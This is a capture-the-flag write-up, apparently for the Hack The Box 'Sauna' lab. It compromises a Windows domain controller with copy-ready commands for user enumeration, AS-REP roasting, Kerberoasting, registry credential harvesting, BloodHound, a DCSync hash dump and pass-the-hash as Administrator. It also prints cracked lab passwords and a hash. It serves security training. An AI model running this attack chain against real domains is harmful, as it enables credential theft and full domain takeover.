## **Summary**

A valid user `fsmith` was found using the employees names at the website, this user had kerberos pre-authentication disabled which allows an attacker to get a hash he can crack to retrieve his password. Another user's credentials were found at the registry, this user `svc_loanmgr` was able to request a replication from the domain controller including all th domain users' NTLM hashes.

## **Enum**

### **nmap**

Initial nmap scan revealed multiple open ports such as 88 (kerberos), 445 (SMB), 5985 (winrm) which indicates that this is a domain controller. We can also see the domain name `egotistical-bank.local` and the hostname `SAUNA`.

```sh
sudo nmap 10.10.10.175 -sS -p- -T4 -oN nmap/ss.nmap
ports=$(cat nmap/ss.nmap | grep open | awk '{print $1}' | tr -d '/tcp' | tr '\n' ',')
nmap 10.10.10.175 -sV -p $ports -oN nmap/svc-full.nmap
```

### **http**

The website doesn't have any functionalities, the only thing we got from it was a list of names at `/about.html`

![](/assets/sauna/003.png)

**users.txt:**

```
Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb
```

### **smb**

We tried enumerating shares without providing any credentials but we were unable to do so.

```sh
crackmapexec smb 10.10.10.175 -u '' -p '' --shares
```

### **kerberos**

#### **fsmith**

Using the list of names we retrieved from the website, we generated possible usernames with the help of [username-anarchy](https://github.com/urbanadventurer/username-anarchy).

```sh
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy/username-anarchy -i users.txt > usernames.txt
```

Then used `kerbrute` to find the valid ones, we only got one hit `fsmith`

```sh
kerbrute userenum --dc 10.10.10.175 --domain egotistical-bank.local usernames.txt
```

The user `fsmith` had kerberos pre-authentication disabled which allowed us to request TGT without providing a password, part of the response is encrypted with the user's password. We could try to crack it offline.

```sh
GetNPUsers.py egotistical-bank.local/fsmith -dc-ip 10.10.10.175
```

![](/assets/sauna/005.png)

We cracked the hash and got `fsmith`'s password: `Thestrokes23`.

```sh
hashcat -a 0 -m 18200 asrep.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

![](/assets/sauna/006.png)

We tried enumerating shares as `fsmith` but we found nothing

#### **hsmith**

A user `hsmith` had an SPN. We tried to request a TGS but kerberos failed because the time in our machine is not syncronized with that of the DC

```sh
GetUserSPNs.py egotistical-bank.local/fsmith:Thestrokes23 -dc-ip 10.10.10.175 -request
```

![](/assets/sauna/009.png)

After syncronizing the time using `rdate`, we were able to get a TGS. Since part of the TGS is encrypted with the password of the user linked to the SPN, in this case `hsmith`, we could crack it and get the password.

```sh
sudo rdate -n 10.10.10.175 &&  GetUserSPNs.py egotistical-bank.local/fsmith:Thestrokes23 -dc-ip 10.10.10.175 -request
```

![](/assets/sauna/010.png)

We noticed that `hsmith` has the same password as `fsmith`: `Thestrokes23`

```sh
hashcat -a 0 -m 13100 tgs.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

### **ldap**

We dumped the domain using ldap

```sh
ldapdomaindump 10.10.10.175 -u egotistical-bank.local\\hsmith -p Thestrokes23 -o domaindump
```

## **Foothold**

The user `fsmith` is part of `Remote Management Users` group, which means he can access the machine using `winrm` protocol.

```sh
firefox domaindump/domain_users.html
```

![](/assets/sauna/014.png)

We connected to the DC using `evil-winrm`

```sh
evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```

![](/assets/sauna/015.png)

We downloaded `winPEAS.exe`

```sh
curl https://github.com/carlospolop/PEASS-ng/releases/download/20230702-bc7ce3ac/winPEASx64.exe -o winPEAS.exe
```

Then uploaded it to the DC from `evil-winrm`

```powershell
upload winPEAS.exe
```

Using `winPEAS.exe`, we found autologon credentials : `EGOTISTICALBANK/svc_loanmanager:Moneymakestheworldgoround!`

![](/assets/sauna/016.png)

This credentials can be retrieved from the registry using this command

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

The domain does not contain any user with the name `svc_loanmanager`, but there is `svc_loanmgr`

![](/assets/sauna/012.png)

We tried the password `Moneymakestheworldgoround!` with the user `svc_loanmgr` and we were able to authenticate.

```sh
crackmapexec smb 10.10.10.175 -d egotistical-bank.local -u svc_loanmgr -p Moneymakestheworldgoround!
```

## **PrivEsc**

To find a path to escalate our privileges on the domain, we used [BloodHound](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound#bloodhound)

First, we downloaded `SharpHound.ps1` to collect data.

```sh
wget https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1
```

Then we uploaded it to the DC from `evil-winrm`.

```powershell
upload bh/SharpHound.ps1
```

![](/assets/sauna/019.png)

After that, we loaded `Invoke-BloodHound` module to collect data.

```powershell
. .\SharpHound.ps1
invoke-bloodhound -collectionmethod all -outputdirectory C:\Users\fsmith\Documents\
```

![](/assets/sauna/020.png)

When it finished, we download the generated zip file into our machine

```powershell
download 20230620091852_BloodHound.zip bh/20230620091852_BloodHound.zip
```

![](/assets/sauna/021.png)

On our machine, we started bloodhound, and upload `20230620091852_BloodHound.zip`.

```sh
sudo neo4j start
bloodhound
```

![](/assets/sauna/022.png)

Going throught the results we found that `svc_loanmgr` have `DCSync` rights, these rights allows a user to request a replication from the DC including `ntds.dit` file which contains all domain users' NTLM hashes.

![](/assets/sauna/023.png)

We can perform a [DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync) attack and get the `Administrator`'s NTLM hash.

> To perform a `DCSync` attack, three permission are needed:
>
> - [DS-Replication-Get-Changes](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes) (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
> - [Replicating Directory Changes All](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all) ( 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
> - [Replicating Directory Changes In Filtered Set](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-in-filtered-set) (89e95b76-444d-4c62-991a-0facbeda640c)

As we already have the credentials for `svc_loanmgr` we could use Impacket's `secretsdump.py` to dump users' NTLM hashes.

```sh
secretsdump.py svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 -just-dc -outputfile dcsync/hashes
```

![](/assets/sauna/024.png)

Finally, we used pass-the-hash to authenticate using `evil-winrm` as `Administrator`.

```sh
evil-winrm -i 10.10.10.175 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```
